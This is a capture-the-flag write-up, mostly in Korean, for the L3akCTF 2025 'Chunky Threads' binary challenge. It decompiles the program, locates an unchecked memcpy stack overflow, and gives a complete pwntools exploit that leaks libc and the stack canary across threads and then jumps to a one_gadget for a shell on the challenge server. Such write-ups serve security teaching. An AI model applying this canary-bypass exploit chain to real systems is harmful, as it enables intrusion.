# Chunky Threads - L3akCTF 2025

*Read this in other languages: [English](README.md)*

## Description

```
Give the chonk a chunk and he just gets chonkier.
Teach him to chunk and he will forestack smashing detected.

Author: dsp
```

# Environment

---

```
pwndbg> checksec
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'/nix/store/hbc8c6fc17xnl85jxlcn9d4kxbyjj6il-shell/lib:/nix/store/cg9s562sa33k78m63njfn1rw47dp9z0i-glibc-2.40-66/lib:/nix/store/7c0v0kbrrdc2cqgisi78jdqxn73n3401-gcc-14.2.1.20250322-lib/lib'
Stripped:   No
```

# Key

## 멀티 스레드 환경에서 Canary

- 프로세스 내 모든 스레드가 동일한 canary 값 공유
- 한 스레드에서 leak 한 canary → 다른 스레드에서 재사용 가능

## 타이밍 공격

- Canary Check 는 함수 종료 시점에 발생
- `sleep()`으로 함수 종료 지연 → 공격 시간 확보

## Race Condition 활용

- 메인 스레드는 계속 명령 처리
- 여러 스레드 동시 공격 가능

# 분석

## 실행 파일 구조

- `chall`: 메인 바이너리
- `wrapper.sh`: 실행 래퍼
- `libc.so.6`: libc 라이브러리

## 주요 함수들

`main() -> parsecmd() -> print() (pthread)`

- main()
    
    ```c
    int __fastcall main(int argc, const char **argv, const char **envp)
    {
      int i; // [rsp+14h] [rbp-41Ch]
      ssize_t v5; // [rsp+18h] [rbp-418h]
      _BYTE buf[1032]; // [rsp+20h] [rbp-410h] BYREF
      unsigned __int64 v7; // [rsp+428h] [rbp-8h]
    
      v7 = __readfsqword(0x28u);
      setbuf(stdout, 0);
      setbuf(stdin, 0);
      memset(buf, 0, 0x400u);
      curthread = threads;
      printf("%s", (const char *)title);
      while ( 1 )
      {
        v5 = read(0, buf, 0x3FFu);
        if ( v5 == -1 )
          break;
        parsecmd(buf, v5);
      }
      for ( i = 0; i <= 9; ++i )
      {
        if ( threads[i] )
          pthread_join(threads[i], 0);
      }
      return 0;
    }
    ```
    
- parsecmd()
    
    ```c
    __int64 __fastcall parsecmd(const char *a1, __int64 a2)
    {
      pthread_t *v2; // rax
      char *endptr[3]; // [rsp+18h] [rbp-18h] BYREF
    
      endptr[2] = (char *)__readfsqword(0x28u);
      endptr[1] = 0;
      endptr[0] = 0;
      pa = 0;
      unk_4040D0 = 0;
      if ( !strncmp(a1, "CHUNKS ", 7u) )
      {
        nthread = strtoul(a1 + 7, 0, 10);
        if ( nthread > 0xAu )
          errx(-1, "bad number of threads");
        printf("set nthread to %u\n", nthread);
      }
      else if ( !strncmp(a1, "CHUNK ", 5u) )
      {
        if ( nthread )
        {
          LODWORD(pa) = strtoul(a1 + 6, endptr, 10);
          DWORD1(pa) = strtoul(endptr[0] + 1, endptr, 10);
          *((_QWORD *)&pa + 1) = endptr[0] + 1;
          unk_4040D0 = a2 - (endptr[0] + 1 - (char *)a1);
          v2 = (pthread_t *)curthread;
          curthread += 8LL;
          pthread_create(v2, 0, print, &pa);
          --nthread;
        }
        else
        {
          puts("no threads remaining");
        }
      }
      else if ( !strncmp(a1, "CHONK ", 5u) )
      {
        puts(chonk);
      }
      else
      {
        puts("unknown command");
      }
      return 0;
    }
    ```
    
- print()
    
    ```c
    void *__fastcall print(void *a1)
    {
      int v3; // [rsp+10h] [rbp-60h]
      unsigned int seconds; // [rsp+14h] [rbp-5Ch]
      _QWORD dest[10]; // [rsp+20h] [rbp-50h] BYREF
    
      dest[9] = __readfsqword(0x28u);
      memset(dest, 0, 64);
      v3 = *((_DWORD *)a1 + 1);
      seconds = *(_DWORD *)a1;
      memcpy(dest, *((const void **)a1 + 1), *((_QWORD *)a1 + 2));
      while ( v3-- )
      {
        puts((const char *)dest);
        sleep(seconds);
      }
      return 0;
    }
    ```
    

## 명령어 구조

`CHUNKS n` → 스레드 개수 설정

`CHUNK id timeout data` → 스레드 생성 및 데이터 출력

- 파라미터 의미
    - `id`: sleep 시간
    - `timeout`: 출력 횟수
    - `data`: 출력할 메시지

`CHONK` → 이스터 에그 메세지 출력 ?


## 취약점 분석

### 취약점 위치 : `print()` 함수의 `memcpy()`

```c
_QWORD dest[10];  // 64바이트 버퍼
memcpy(dest, message_ptr, message_len);  // 길이 검증 없음
```

### 스택 레이아웃

```
[rbp + 0x8]   <- Return Address
[   rbp   ]   <- Stack Frame Pointer
[rbp - 0x8]   <- Stack Canary
	  ...
[rbp - 0x20]  <- dest [64byte]
```

### 오버플로우 조건

- `message_len > 64` → canary 덮어씀
- `message_len > 72` → Return Address 덮어씀

## 3단계 공격

### [1] Stage 1 : `libc Address Leak`

```python
# [1] libc leak
p.sendline(b'CHUNKS 3')
payload = b"CHUNK 0 1 " + b'a'*0x3f # overflow offset of libc 
p.sendline(payload)
p.recvuntil(b'aaaaa\n')
leak = u64(p.recv(6)+b'\x00\x00')
libc_base = leak + 0x940 + 0x3000
# libc_base = leak + 0x940 # local용
print(f"libcbase: {hex(libc_base)}")
```

- 63 byte로 오버플로우 → libc address leak
- `libc_base = leak + 0x940 + 0x3000` #로컬과 원격에 0x3000 만큼의 차이가 있었다.

### [2] Stage 2 : `Canary leak`

```python
# [2] canary leak
payload = b"CHUNK 100 1 " + b'b'*0x48 # overflow offset of canary # not to exit program , set timeout 100
p.sendline(payload)
p.recvuntil(b'b\n')
canary = u64(b'\x00' + p.recv(7))
print(f"canary : {hex(canary)}")
```

- 72 byte로 오버플로우 → Canary 첫 바이트 오염
- `sleep(100)` → 100초 대기로 다른 쓰레드 공격 시간 확보
- `puts()`로 손상된 canary 출력 → 원본 canary leak

### [3] Stage 3 : `ROP Chain` & `One Gadget`

```python
# [3] ROP 
one_gadget = libc_base + 0x583ec
payload = b'CHUNK 0 1 ' + b'c'*0x48 + p64(canary) + b'd'*0x8 + p64(one_gadget)
p.send(payload)
```

- 정확한 canary 값으로 protection bypass
- one_gadget 으로 셸 획득

```python
from pwn import *

p = remote('34.45.81.67', 16006)
# p = process('./wrapper.sh')
elf = ELF('./chall')
# context.log_level ='debug'
libc = ELF('./libc.so.6')

# [1] libc leak
p.sendline(b'CHUNKS 3')
payload = b"CHUNK 0 1 " + b'a'*0x3f # overflow offset of libc 
p.sendline(payload)
p.recvuntil(b'aaaaa\n')
leak = u64(p.recv(6)+b'\x00\x00')
libc_base = leak + 0x940 + 0x3000
# libc_base = leak + 0x940 # local용
print(f"libcbase: {hex(libc_base)}")

# [2] canary leak
payload = b"CHUNK 100 1 " + b'b'*0x48 # overflow offset of canary # not to exit program , set timeout 100
p.sendline(payload)
p.recvuntil(b'b\n')
canary = u64(b'\x00' + p.recv(7))
print(f"canary : {hex(canary)}")

# [3] ROP 
one_gadget = libc_base + 0x583ec
payload = b'CHUNK 0 1 ' + b'c'*0x48 + p64(canary) + b'd'*0x8 + p64(one_gadget)
p.send(payload)

p.interactive()
```
